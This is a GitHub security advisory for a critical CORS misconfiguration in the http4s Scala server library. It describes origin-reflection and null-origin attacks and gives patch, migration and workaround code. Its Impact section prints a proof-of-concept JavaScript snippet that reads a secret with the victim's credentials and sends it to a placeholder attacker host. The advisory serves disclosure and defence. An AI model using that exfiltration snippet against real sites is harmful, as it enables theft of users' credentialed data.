# [C] Default CORS config allows any origin with credentials

## Summary
Severity: Critical
Advisory: GHSA-52cf-226f-rhr6
CVE: CVE-2021-39185
CWE: CWE-346
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2021-09-02
Source: https://github.com/advisories/GHSA-52cf-226f-rhr6
Type: github-advisory

## Affected
- Maven: `org.http4s:http4s-server_2.13.0-M5` — affected >=0
- Maven: `org.http4s:http4s-server_3` — affected >=0.22.0 <0.22.3
- Maven: `org.http4s:http4s-server_3` — affected >=0.23.0 <0.23.2
- Maven: `org.http4s:http4s-server_2.10` — affected >=0
- Maven: `org.http4s:http4s-server_2.11` — affected >=0
- Maven: `org.http4s:http4s-server_2.12` — affected >=0 <0.21.27
- Maven: `org.http4s:http4s-server_2.12` — affected >=0.22.0 <0.22.3
- Maven: `org.http4s:http4s-server_2.12` — affected >=0.23.0 <0.23.2
- Maven: `org.http4s:http4s-server_2.13` — affected >=0 <0.21.27
- Maven: `org.http4s:http4s-server_2.13` — affected >=0.22.0 <0.22.3
- Maven: `org.http4s:http4s-server_2.13` — affected >=0.23.0 <0.23.2

## Details
### Impact

#### Origin reflection attack

The default CORS configuration is vulnerable to an origin reflection attack.  Take the following http4s app `app`, using the default CORS config, running at https://vulnerable.example.com:

```scala
val routes: HttpRoutes[F] = HttpRoutes.of {
  case req if req.pathInfo === "/secret" =>
    Response(Ok).withEntity(password).pure[F]
}
val app = CORS(routes.orNotFound)
```

The following request is made to our server:

```http
GET /secret HTTP/1.1
Host: vulnerable.example.com
Origin: https://adversary.example.net
Cookie: sessionId=...
```

When the `anyOrigin` flag of `CORSConfig` is `true`, as is the case in the default argument to `CORS`, the middleware will allow sharing its resource regardless of the `allowedOrigins` setting.  Paired with the default `allowCredentials`, the server approves sharing responses that may have required credentials for sensitive information with any origin:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://adversary.example.org
Access-Control-Allow-Credentials: true 
Content-Type: text/plain

p4ssw0rd
```

A malicious script running on `https://adversary.example.org/` can then exfiltrate sensitive information with the user's credentials to `vulnerable.exmaple.org`:

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable.example.org/secret',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//bad-people.example.org/log?key='+this.responseText; 
};
```

#### Null origin attack

The middleware is also susceptible to a Null Origin Attack.  A user agent may send `Origin: null` when a request is made from a sandboxed iframe.  The CORS-wrapped http4s app will respond with `Access-Control-Allow-Origin: null`, permitting a similar exfiltration of secrets to the above.

### Patches

The problem is fixed in 0.21.27, 0.22.3, 0.23.2, and 1.0.0-M25.  The original `CORS` implementation and `CORSConfig` are deprecated.  In addition to the origin vulnerability, the following deficiencies in the deprecated version are fixed in the new signatures:

### Migration

The `CORS` object exposes a default `CORSPolicy` via `CORS.policy`.  This can be configured with various `with*` methods, like any http4s builder.  Finally, the `CORSPolicy` may be applied to any `Http`, like any other http4s middleware:

```scala
val routes: HttpRoutes[F] = ???
val cors = CORS.policy
  .withAllowOriginAll
  .withAllowCredentials(false)
  .apply(routes)
```

### Workarounds

It is possible to be safe in unpatched versions, but note the following defects exist:

* The `anyMethod` flag, enabled by default, accepts methods that cannot be enumerated in the `Access-Control-Allow-Methods` preflight response.
* Rejected CORS requests receive a `403` response, when the client should be the enforcement point. The server should just omit all CORS response headers.
* Does not send `Vary: Access-Control-Request-Headers` on preflight requests. This may confuse caches.
* Does not validate the `Access-Control-Request-Headers` of a preflight request. This validation is not mandated by the Fetch standard, but is typical of most server implementations.
* Needlessly sends `Vary: Access-Control-Request-Method` on non-preflight requests.  This should be harmless in practice.
* Needlessly sends `Access-Control-Max-Age` header on non-preflight requests.  This should be harmless in practice.
* Sends an invalid `Access-Control-Allow-Credentials: false` instead of omitting the header.  This should be harmless in practice.

#### Explicit origins

In versions before the patch, set `anyOrigin` to `false`, and then specifically include trusted origins in `allowedOrigins`.

##### 0.21.x

```scala
val routes: HttpRoutes[F] = ???
val config = CORS.DefaultConfig.copy(
  anyOrigin = false,
  allowOrigins = Set("http://trusted.example.com")
)
val cors = CORS(routes, config)
```

###### 0.22.x, 0.23.x, 1.x

```scala
val routes: HttpRoutes[F] = ???
val config = CORSConfig.default
  .withAnyOrigin(false)
  .withAllowedOrigins(Set("http://trusted.example.com"))
val cors = CORS(routes, config)
```

#### Disable credentials

Alternatively, sharing responses tainted by credentials can be deprecated.

##### 0.21.x

```scala
val routes: HttpRoutes[F] = ???
val config = CORS.DefaultConfig.copy(allowCredentials = false)
val cors = CORS(routes, config)
```

##### 0.22.x, 0.23.x, 1.x

```scala
val routes: HttpRoutes[F] = ???
val config = CORSConfig.default.withAllowedCredentials(false)
val cors = CORS(routes, config)
```

### References
* The [MDN guide to CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
* [PayloadsAllTheThings CORS misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/6cba7ceda93c3f64559c3e73881c21076536e5fb/CORS%20Misconfiguration/README.md)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [GitHub](http://github.com/http4s/http4s)
* Contact us via the [http4s security policy](https://github.com/http4s/http4s/security/policy)

## References
- https://github.com/http4s/http4s/security/advisories/GHSA-52cf-226f-rhr6
- https://nvd.nist.gov/vuln/detail/CVE-2021-39185
- https://github.com/http4s/http4s
- https://github.com/http4s/http4s/releases/tag/v0.23.2
